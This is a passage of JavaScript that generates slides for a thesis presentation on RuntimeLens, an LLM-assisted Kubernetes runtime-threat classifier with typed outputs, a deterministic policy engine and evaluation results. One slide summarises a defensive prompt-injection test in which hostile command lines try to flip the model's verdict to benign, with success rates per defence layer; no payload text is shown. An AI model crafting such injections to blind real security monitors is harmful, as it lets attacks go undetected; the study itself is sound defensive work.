      x: x + 0.07, y: 3.04, w: bw - 0.14, h: 1.1, margin: 0,
      fontFace: SANS, fontSize: 8.5, color: C.body, align: "center", lineSpacing: 11, valign: "top",
    });
  });

  card(s, M, 4.62, 6.0, 2.1, C.card2);
  s.addText("WHAT THE MODEL ACTUALLY READ", {
    x: M + 0.26, y: 4.78, w: 5.5, h: 0.26, margin: 0,
    fontFace: SANS, fontSize: 9, bold: true, color: C.steel, charSpacing: 1.3,
  });
  s.addText(
    "<workload>tenant=tenant-a pod=api-service-7d4f</workload>\n<runtime>process=sh cmd=/bin/sh syscall=execve</runtime>\n<facts>host_socket=false privileged=false root_user=true</facts>\n<baseline>deviations=unexpected_shell shell_expected=false</baseline>",
    { x: M + 0.26, y: 5.12, w: 5.5, h: 1.4, margin: 0, fontFace: MONO, fontSize: 8.5, color: C.body, lineSpacing: 13, valign: "top" }
  );

  card(s, M + 6.28, 4.62, 6.43, 2.1, C.steelSoft);
  s.addText("WHAT THE MODEL ANSWERED", {
    x: M + 6.54, y: 4.78, w: 5.9, h: 0.26, margin: 0,
    fontFace: SANS, fontSize: 9, bold: true, color: C.steel, charSpacing: 1.3,
  });
  const dec = [
    ["attack_type", "privilege_abuse  p = 0.88"],
    ["severity", "3.4  →  mapped severity 4.4"],
    ["shell_unexpected", "0.94"],
    ["resource_exposure", "0.31"],
  ];
  dec.forEach((d, i) => {
    const y = 5.18 + i * 0.36;
    s.addText(d[0], { x: M + 6.54, y, w: 2.1, h: 0.3, margin: 0, fontFace: MONO, fontSize: 9.5, color: C.muted });
    s.addText(d[1], { x: M + 8.6, y, w: 4.0, h: 0.3, margin: 0, fontFace: MONO, fontSize: 9.5, bold: true, color: C.ink });
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 10. TYPED-DECISION CONTRACT
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "How it works", "Six fixed questions, one shared answer sheet",
    "The model cannot freelance. It answers these and nothing else.");

  card(s, M, 1.95, 6.4, 3.62, C.card2);
  s.addText("REQUEST  ·  POST https://api.scaledown.xyz/v1/scaledown", {
    x: M + 0.28, y: 2.1, w: 5.9, h: 0.26, margin: 0,
    fontFace: MONO, fontSize: 9.5, bold: true, color: C.steel, valign: "top",
  });
  s.addText(
    '{\n  "model": "classify-1",\n  "state": { "text": "<incident_state>…</incident_state>" },\n  "questions": {\n    "attack_type": { "type": "choice",\n      "criteria": { "benign": "…", "container_escape": "…",\n                    "privilege_abuse": "…", "cryptomining": "…",\n                    "unknown": "…" } },\n    "severity": { "type": "score",\n      "criteria": ["Informational", "Low", "Medium", "High", "Critical"] },\n    "baseline_deviation": { "type": "noul" },\n    "shell_unexpected":    { "type": "noul" },\n    "resource_exposure":   { "type": "noul" },\n    "resource_abuse":      { "type": "noul" }\n  }\n}',
    { x: M + 0.28, y: 2.45, w: 5.9, h: 3.0, margin: 0, fontFace: MONO, fontSize: 8.5, color: C.body, lineSpacing: 12, valign: "top" }
  );

  s.addText("One HTTP call per event. Six typed questions. The reply is a JSON object the policy engine can check field by field.", {
    x: M, y: 5.72, w: 6.4, h: 0.5, margin: 0,
    fontFace: SANS, fontSize: 10.5, italic: true, color: C.muted, lineSpacing: 14, valign: "top",
  });

  const qTypes = [
    ["choice", "Picks exactly one threat class, with a full probability distribution.", C.sky],
    ["score", "Probability-weighted position on a 0-4 severity scale.", C.steel],
    ["noul", "Four yes/no evidence checks: deviation, unexpected shell, host access, mining.", C.teal],
  ];
  qTypes.forEach((t, i) => {
    const y = 1.95 + i * 1.08;
    card(s, M + 6.65, y, 5.44, 0.96);
    s.addText(t[0], {
      x: M + 6.9, y: y + 0.09, w: 1.6, h: 0.32, margin: 0,
      fontFace: MONO, fontSize: 13, bold: true, color: t[2], valign: "middle",
    });
    s.addText(t[1], {
      x: M + 6.9, y: y + 0.42, w: 4.96, h: 0.46, margin: 0,
      fontFace: SANS, fontSize: 10.5, color: C.body, lineSpacing: 14, valign: "top",
    });
  });

  card(s, M + 6.65, 5.2, 5.44, 1.5, C.blueSoft);
  s.addText("WHY THIS MATTERS", {
    x: M + 6.92, y: 5.32, w: 4.9, h: 0.26, margin: 0,
    fontFace: SANS, fontSize: 9, bold: true, color: C.steel, charSpacing: 1.3, valign: "top",
  });
  s.addText(
    "The model cannot invent a new class, a new severity we did not define, or a prose verdict. Every field is machine-checkable before the policy engine acts.",
    { x: M + 6.92, y: 5.62, w: 4.9, h: 0.95, margin: 0, fontFace: SANS, fontSize: 10.5, color: C.body, lineSpacing: 15, valign: "top" }
  );

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 11. MODEL COMPARISON
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Analysis", "Does a decision model beat a rule?", "");

  img(s, "fig_model_comparison.png", M, 1.95, 7.6);

  const tiles = [
    ["0.5333", "ScaleDown Classify-1\nMacro-F1 on held-out runs", C.steel],
    ["3.6%", "false alarms vs 18.4%\nfor default Falco rules", C.green],
    ["94.7%", "precision when the system\nis confident enough to act", C.sky],
  ];
  tiles.forEach((t, i) => {
    stat(s, RIGHT.x, 1.95 + i * 1.55, RIGHT.w, 1.38, t[0], t[1], t[2]);
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 12. ABLATIONS
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Analysis", "Which piece actually earns its keep?", "");

  img(s, "fig_ablations.png", M, 1.95, 7.6);

  s.addText([
    { text: "How to read it:  ", options: { bold: true, color: C.steel } },
    { text: "each bar removes one piece from the full system and measures what it costs. Fusion is the only change that clears the noise floor. The rule pre-filter is what keeps the API bill small.", options: { color: C.muted } },
  ], {
    x: M, y: 5.85, w: 7.6, h: 0.8, margin: 0,
    fontFace: SANS, fontSize: 10.5, lineSpacing: 14.5, valign: "top",
  });

  const notes = [
    ["Fusing all five feeds is the big win", "Falco alone cannot resolve most cases. Adding audit + network + metrics is worth +0.20 Macro-F1.", C.sky],
    ["Typed questions catch impossible answers", "When Choice and Noul disagree (benign + deviation > 0.6), the policy engine escalates to a human.", C.steel],
    ["Baseline context is real but small", "+0.02 Macro-F1 — and false alarms drop 41.7%. Small effect, honest report.", C.teal],
    ["Pre-filtering pays for the API", "Rules screen out 64.5% of events; the model sees only the hard cases.", C.green],
  ];
  notes.forEach((n, i) => {
    const y = 1.95 + i * 1.26;
    card(s, RIGHT.x, y, RIGHT.w, 1.1);
    s.addText(n[0], {
      x: RIGHT.x + 0.24, y: y + 0.09, w: RIGHT.w - 0.48, h: 0.28, margin: 0,
      fontFace: SANS, fontSize: 11.5, bold: true, color: n[2], valign: "top",
    });
    s.addText(n[1], {
      x: RIGHT.x + 0.24, y: y + 0.38, w: RIGHT.w - 0.48, h: 0.64, margin: 0,
      fontFace: SANS, fontSize: 9.5, color: C.muted, lineSpacing: 12.5, valign: "top",
    });
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 13. LIVE TEST
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Analysis", "We also ran it live against real APIs",
    "Same protocol, but live calls instead of fixtures. Here is what moved and what did not.");

  img(s, "fig_live_ab.png", M, 1.95, 7.6);

  const arms = R.arms.slice(0, 3);
  const top = 1.95;
  const bottom = 6.05;
  const gapY = 0.22;
  const cardH = (bottom - top - gapY * (arms.length - 1)) / arms.length;
  arms.forEach((arm, i) => {
    const y = top + i * (cardH + gapY);
    card(s, RIGHT.x, y, RIGHT.w, cardH);
    s.addText(arm.arm, {
      x: RIGHT.x + 0.22, y: y + 0.1, w: RIGHT.w - 0.44, h: 0.26, margin: 0,
      fontFace: MONO, fontSize: 10.5, bold: true, color: C.steel, valign: "top",
    });
    const f1Delta = arm.delta_macro_f1;
    const fprDelta = arm.delta_benign_fpr;
    const lines = [
      ["Macro-F1", `${arm.with_baseline.macro_f1.toFixed(3)} with / ${arm.without_baseline.macro_f1.toFixed(3)} without`],
      ["Δ Macro-F1", `${f1Delta >= 0 ? "+" : ""}${f1Delta.toFixed(4)}`],
      ["Δ Benign FPR", `${fprDelta >= 0 ? "+" : ""}${fprDelta.toFixed(4)}`],
      ["Attacks → benign", `${arm.attacks_called_benign.with_baseline} vs ${arm.attacks_called_benign.without_baseline}`],
    ];
    const pitch = (cardH - 0.46) / lines.length;
    lines.forEach((l, j) => {
      s.addText(l[0], {
        x: RIGHT.x + 0.22, y: y + 0.42 + j * pitch, w: 1.55, h: 0.26, margin: 0,
        fontFace: SANS, fontSize: 9, color: C.muted, valign: "middle",
      });
      s.addText(l[1], {
        x: RIGHT.x + 1.82, y: y + 0.42 + j * pitch, w: RIGHT.w - 2.04, h: 0.26, margin: 0,
        fontFace: MONO, fontSize: 9, bold: true, color: j === 1 ? (f1Delta >= 0 ? C.green : C.amber) : C.ink, valign: "middle",
      });
    });
  });

  card(s, M, 6.35, 12.09, 0.55, C.amberSoft);
  s.addText([
    { text: "Honest result:  ", options: { bold: true, color: C.amber } },
    { text: "no detectable Macro-F1 change at n=28 — but every benign false alarm vanished (27.3 pp on one arm), and attacks read as benign dropped from 3 to 1. We report it exactly as measured.", options: { color: C.body } },
  ], {
    x: M + 0.3, y: 6.4, w: 11.5, h: 0.45, margin: 0,
    fontFace: SANS, fontSize: 10.5, valign: "middle",
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 14. WHAT THE REAL API RETURNS
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Analysis", "What the real ScaleDown API returns",
    "Six live calls with this project's rubric, not recorded fixtures.");

  const rows = [
    ["HostPath mount of the runtime socket", "container_escape", "✓"],
    ["Shell in payment pod, root user", "privilege_abuse", "✓"],
    ["Sustained CPU + mining-pool egress", "cryptomining", "✓"],
    ["Scheduled database backup", "benign", "✓"],
    ["Plain nginx start", "privilege_abuse (wrong)", "✗"],
    ["Audit collector halted", "unknown", "✓"],
  ];
  rows.forEach((r, i) => {
    const y = 2.0 + i * 0.6;
    card(s, M, y, 7.7, 0.52);
    s.addText(r[0], {
      x: M + 0.25, y: y + 0.08, w: 4.8, h: 0.36, margin: 0,
      fontFace: SANS, fontSize: 10.5, color: C.body, valign: "middle",
    });
    s.addText(r[1], {
      x: M + 5.1, y: y + 0.08, w: 2.1, h: 0.36, margin: 0,
      fontFace: MONO, fontSize: 10, bold: true, color: r[2] === "✓" ? C.green : C.red, valign: "middle",
    });
  });
  s.addText("Median latency 495 ms  ·  ~$0.0001 per call  ·  HTTP 200 for every one", {
    x: M, y: 5.82, w: 7.7, h: 0.3, margin: 0,
    fontFace: SANS, fontSize: 10, italic: true, color: C.muted,
  });

  card(s, RIGHT.x, 2.0, RIGHT.w, 4.0, C.blueSoft);
  s.addText("WHY THAT ONE MISS HELPS US", {
    x: RIGHT.x + 0.25, y: 2.15, w: RIGHT.w - 0.5, h: 0.28, margin: 0,
    fontFace: SANS, fontSize: 9, bold: true, color: C.steel, charSpacing: 1.3, valign: "top",
  });
  s.addText(
    "The model read a plain nginx start as privilege_abuse.\n\nA rule pre-filter in front of the API would never have sent that event.\n\nAnd the deterministic policy engine would not have quarantined a pod on confidence 0.36 with zero physical facts.\n\nThe model proposes. Deterministic code decides.",
    { x: RIGHT.x + 0.25, y: 2.52, w: RIGHT.w - 0.5, h: 2.9, margin: 0, fontFace: SANS, fontSize: 11, color: C.body, lineSpacing: 17, valign: "top" }
  );

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 15. ADVERSARIAL
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Analysis", "Can a hostile command line fool it?",
    "Ten injection payloads, four defence layers. ASR = attacks flipped to benign (lower is better).");

  img(s, "fig_asr.png", M, 1.95, 7.5);

  const tiers = [
    ["Tier 0", "Raw payload", "20% / 40% live", C.red],
    ["Tier 1", "Sanitizer + XML escaping", "0% live", C.amber],
    ["Tier 2", "+ fact overrides", "5% / 0% live", C.amber],
    ["Tier 3", "+ prompt-guard ensemble", "0% live", C.green],
  ];
  tiers.forEach((t, i) => {
    const y = 1.95 + i * 0.93;
    card(s, RIGHT.x, y, RIGHT.w, 0.8);
    s.addText(t[0], {
      x: RIGHT.x + 0.22, y: y + 0.08, w: 1.0, h: 0.28, margin: 0,
      fontFace: SANS, fontSize: 10.5, bold: true, color: C.muted, valign: "middle",
    });
    s.addText(t[2], {
      x: RIGHT.x + 1.5, y: y + 0.04, w: RIGHT.w - 1.72, h: 0.32, margin: 0,
      fontFace: SANS, fontSize: 12.5, bold: true, color: t[3], align: "right", valign: "middle",
    });
    s.addText(t[1], {
      x: RIGHT.x + 0.22, y: y + 0.38, w: RIGHT.w - 0.44, h: 0.26, margin: 0,
      fontFace: SANS, fontSize: 9.5, color: C.body, valign: "top",
    });
  });

  card(s, M, 6.15, 12.09, 0.68, C.greenSoft);
  s.addText([
    { text: "Result:  ", options: { bold: true, color: C.green } },
    { text: "no attack is classified as benign under the full stack, in any repetition we ran. 6 of 10 payloads are blocked before the model sees them; the remaining 4 are held by fact checks and the confidence gate.", options: { color: C.body } },
  ], {
    x: M + 0.3, y: 6.2, w: 11.5, h: 0.58, margin: 0,
    fontFace: SANS, fontSize: 10.5, valign: "middle", lineSpacing: 14,
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 16. PERFORMANCE
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Analysis", "Fast enough for a busy cluster", "");

  img(s, "fig_latency.png", M, 2.05, 6.1);

  const tiles = [
    ["7,879.6", "events per second\nwith the audit chain on", C.steel],
    ["122.6 µs", "p50 end-to-end\nper event", C.teal],
    ["0.00%", "errors across all\n5,000 events", C.green],
    ["70%", "of the time budget is\nthe tamper-evident write", C.amber],
  ];
  tiles.forEach((t, i) => {
    stat(s, 7.2, 2.05 + i * 1.2, W - M - 7.2, 1.08, t[0], t[1], t[2]);
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 17. WHAT'S GENUINELY NEW
// ---------------------------------------------------------------------------
{
  const s = slide();
  kicker(s, M, 0.34, "Contribution");
  s.addText("What this project adds to the field", {
    x: M, y: 0.68, w: 11.5, h: 0.72, margin: 0,
    fontFace: HERO, fontSize: 30, bold: true, color: C.ink, valign: "middle",
  });

  const items = [
    ["Baselines that operators write", "Every learning-based baseline we found is fitted from data. Ours is declared by hand in YAML, versioned in Git, and reviewed like code."],
    ["A typed decision, not an essay", "Choices with probabilities, a severity score, yes/no evidence flags. Output a policy engine can verify and an auditor can replay."],
    ["The model is never the last authority", "Physical facts come from the pod spec, not the model. A hostile command line cannot talk its way past a read-only fact check."],
    ["Proof, not vibes", "Pre-registered hypothesis, grouped splits, McNemar, cluster-aware bootstrap. We report the null result as loudly as the positive one."],
    ["AI that cannot delete your pod", "No delete verbs anywhere in our RBAC. Dry-run default. Quarantine is a label with a 15-minute auto-rollback."],
  ];
  items.forEach((it, i) => {
    const y = 1.72 + i * 1.02;
    const w = W - 2 * M;
    s.addShape(pptx.ShapeType.roundRect, {
      x: M, y, w, h: 0.92, rectRadius: 0.08,
      fill: { color: "FFFFFF" },
      line: { color: C.line, width: 0.75 },
      shadow: { type: "outer", color: "9FB8D0", opacity: 0.22, blur: 6, offset: 1, angle: 45 },
    });
    s.addShape(pptx.ShapeType.ellipse, {
      x: M + 0.24, y: y + 0.26, w: 0.4, h: 0.4,
      fill: { color: C.steel }, line: { type: "none" },
    });
    s.addText(String(i + 1).padStart(2, "0"), {
      x: M + 0.24, y: y + 0.26, w: 0.4, h: 0.4, margin: 0,
      fontFace: MONO, fontSize: 10, bold: true, color: "FFFFFF", align: "center", valign: "middle",
    });
    s.addText(it[0], {
      x: M + 0.82, y: y + 0.12, w: 4.3, h: 0.3, margin: 0,
      fontFace: SANS, fontSize: 12.5, bold: true, color: C.steel, valign: "middle",
    });
    s.addText(it[1], {
      x: M + 5.3, y: y + 0.12, w: w - 5.55, h: 0.68, margin: 0,
      fontFace: SANS, fontSize: 10.5, color: C.body, lineSpacing: 14, valign: "middle",
    });
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 18. WHAT WE WON'T CLAIM
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Being straight", "What we will not claim at the viva", "");

  const lims = [
    ["This is a lab, not a production cluster", "All 400 runs are controlled, harmless simulations in an isolated cluster. No real malware, no real attacks, no external mining pools."],
    ["The test split is small (112 runs)", "Five classes, uneven counts. The honest sentence is: real but modest effect, wide intervals. A bigger corpus is the next ticket."],
    ["Live models vary run to run", "Hosted models answered the same prompt differently across reps. Everything we report live is averaged over repetitions, and we show the ranges."],
    ["Vendor numbers are vendor numbers", "ScaleDown publishes accuracy numbers but no public harness. We quote them as vendor claims, not as our measurements."],
    ["The eval is a lab artefact", "The 28-incident live study reproduces our lab wiring, not production traffic. A field trial is the open question."],
  ];
  lims.forEach((l, i) => {
    const y = 1.95 + i * 1.0;
    card(s, M, y, 12.09, 0.86);
    s.addShape(pptx.ShapeType.rect, {
      x: M, y, w: 0.05, h: 0.86, fill: { color: C.amber }, line: { type: "none" },
    });
    s.addText(l[0], {
      x: M + 0.3, y: y + 0.09, w: 11.4, h: 0.28, margin: 0,
      fontFace: SANS, fontSize: 12.5, bold: true, color: C.ink, valign: "top",
    });
    s.addText(l[1], {
      x: M + 0.3, y: y + 0.4, w: 11.4, h: 0.4, margin: 0,
      fontFace: SANS, fontSize: 10.5, color: C.body, lineSpacing: 14.5, valign: "top",
    });
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 19. REFERENCES
// ---------------------------------------------------------------------------
{
  const s = slide();
  kicker(s, M, 0.34, "References");
  s.addText("Selected literature", {
    x: M, y: 0.68, w: 9, h: 0.6, margin: 0,
    fontFace: SANS, fontSize: 26, bold: true, color: C.ink,
  });

  const refs = [
    ["[1]", "Syairozi & Arizal. eBPF Runtime Security Monitoring Tools. RITECH 2025. doi:10.5220/0014272700004928"],
    ["[2]", "Ryu et al. Hybrid Runtime Detection of Malicious Containers Using eBPF. CMC 86(3), 2026. doi:10.32604/cmc.2025.074871"],
    ["[3]", "Kim et al. Detecting Cryptojacking Containers Using eBPF and ML. Electronics 14(6):1208, 2025. doi:10.3390/electronics14061208"],
    ["[4]", "Galletta. Enforcement of In-Kernel Stateful Security Policies via eBPF. arXiv:2609.13930, 2026."],
    ["[5]", "Islam & Rashid. GCID: Graph-Correlated Intrusion Detection for Kubernetes. SSRN 2026. doi:10.2139/ssrn.7079427"],
    ["[6]", "Chen et al. Shadowkube: Behavioural Monitoring + Honeypots for Kubernetes. Cybersecurity, 2025. doi:10.1186/s42400-025-00372-7"],
    ["[7]", "Zou et al. Towards Generalizable Context-aware Anomaly Detection. arXiv:2508.01844, 2025."],
    ["[8]", "Franzil et al. Sharpening Kubernetes Audit Logs with Context Awareness. Computer Networks 276:111890, 2026."],
    ["[9]", "Aly, Mansour & Youssef. OCR-APT: Reconstructing APT Stories from Audit Logs. ACM CCS 2025. doi:10.1145/3719027.3765219"],
    ["[10]", "Oppong-Asante et al. Runtime Detection Using eBPF Network Telemetry in Kubernetes. J. Comput. Virol., 2026. doi:10.1007/s11416-026-00671-8"],
    ["[11]", "Eom, Suk & Hwang. An Empirical Study and Benchmark of Kubernetes Misconfiguration Scanners. PACMSE 2026. doi:10.1145/3832297"],
    ["[12]", "Malul et al. GenKubeSec: LLM-Based Kubernetes Misconfiguration Detection. arXiv:2405.19954, 2024."],
    ["[13]", "Shi et al. CryptoCatch: Cryptomining Hidden Nowhere. IEEE TDSC, 2026. doi:10.1109/TDSC.2026.3661145"],
    ["[14]", "Chakravorty & Elsayed. Empirical Evaluation of ML for Cloud Cryptojacking Detection. arXiv:2610.20658, 2026."],
    ["[15]", "Karanjai et al. Context Contamination in LLM Analysis of Network Security Logs. arXiv:2607.14493, 2026."],
    ["[16]", "Ndichu et al. AI-Driven Security Alert Screening and Alert Fatigue in SOCs. arXiv:2605.08316, 2026."],
    ["[17]", "Wei et al. CORTEX: Collaborative LLM Agents for High-Stakes Alert Triage. arXiv:2510.00311, 2025."],
    ["[18]", "Chen, Long & Wang. REFINE: A Resilient Evolution Framework for Enterprise Alert Triage. arXiv:2609.32516, 2026."],
    ["[19]", "Souza & Lee. Enforcing Access Control at Container Runtime: a Systematic Survey. SSRN 2026. doi:10.2139/ssrn.6721326"],
    ["[20]", "ScaleDown AI. ScaleDown Typed Decisions API Reference. docs.scaledown.ai, 2026."],
  ];

  const half = Math.ceil(refs.length / 2);
  [[0, half], [half, refs.length]].forEach(([from, to], col) => {
    const x = M + col * 6.16;
    let y = 1.6;
    refs.slice(from, to).forEach((r) => {
      const lines = Math.ceil(r[1].length / 88);
      const h = 0.12 + lines * 0.145;
      s.addText(r[0], {
        x, y, w: 0.4, h, margin: 0,
        fontFace: MONO, fontSize: 8.5, bold: true, color: C.steel, valign: "top",
      });
      s.addText(r[1], {
        x: x + 0.44, y, w: 5.5, h, margin: 0,
        fontFace: SANS, fontSize: 8.5, color: C.body, lineSpacing: 10.5, valign: "top",
      });
      y += h + 0.03;
    });
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 20. CLOSING
// ---------------------------------------------------------------------------
{
  const s = pptx.addSlide();
  s.background = { path: path.join(ASSETS, "bg_closing.png") };

  kicker(s, 1.4, 1.0, "Takeaways");
  s.addText("Context is the feature.\nSafety is not the model's job.", {
    x: 1.4, y: 1.42, w: 9.6, h: 1.9, margin: 0,
    fontFace: HERO, fontSize: 37, bold: true, color: C.ink, lineSpacing: 46, valign: "top",
  });

  const takes = [
    ["01", "Typed, constrained decisions beat free-form answers",
      "Every output is machine-checkable, cacheable and auditable — and reproducible on open-weight models with the same rubric."],
    ["02", "Baseline context shifts which errors the model makes",
      "False alarms vanish on one arm (27.3 pp); attacks read as routine drop from 3 to 1 on another. Macro-F1 itself: inconclusive at n=28 — reported honestly."],
    ["03", "A hostile command line cannot hijack this system",
      "Because the model never holds the last decision. Sanitizer, fact overrides and a guard ensemble run before and around it."],
  ];
  takes.forEach((t, i) => {
    const y = 3.55 + i * 1.06;
    s.addText(t[0], {
      x: 1.4, y: y + 0.02, w: 0.6, h: 0.36, margin: 0,
      fontFace: MONO, fontSize: 15, bold: true, color: C.steel, valign: "top",
    });
    s.addText(t[1], {
      x: 2.1, y, w: 9.5, h: 0.34, margin: 0,
      fontFace: SANS, fontSize: 14.5, bold: true, color: C.ink, valign: "top",
    });
    s.addText(t[2], {
      x: 2.1, y: y + 0.34, w: 9.5, h: 0.58, margin: 0,
      fontFace: SANS, fontSize: 11, color: C.muted, lineSpacing: 15, valign: "top",
    });
  });

  s.addText("Next:  a field trial on a non-lab cluster, and an on-node quantised model so telemetry never leaves the pod.", {
    x: 1.4, y: 6.95, w: 10.0, h: 0.35, margin: 0,
    fontFace: SANS, fontSize: 10.5, italic: true, color: C.muted,
  });
  s.addText("github.com/himanshukumar19/RuntimeLens", {
    x: W - M - 4.2, y: H - 0.42, w: 4.2, h: 0.28, margin: 0,
    fontFace: MONO, fontSize: 9.5, color: C.muted, align: "right",
  });

  next();
}

// ---------------------------------------------------------------------------
fs.mkdirSync(OUT_DIR, { recursive: true });
const out = path.join(OUT_DIR, "RuntimeLens_presentation.pptx");
pptx.writeFile({ fileName: out }).then(() => {
  console.log("wrote", out, "slides:", SLIDE);
});
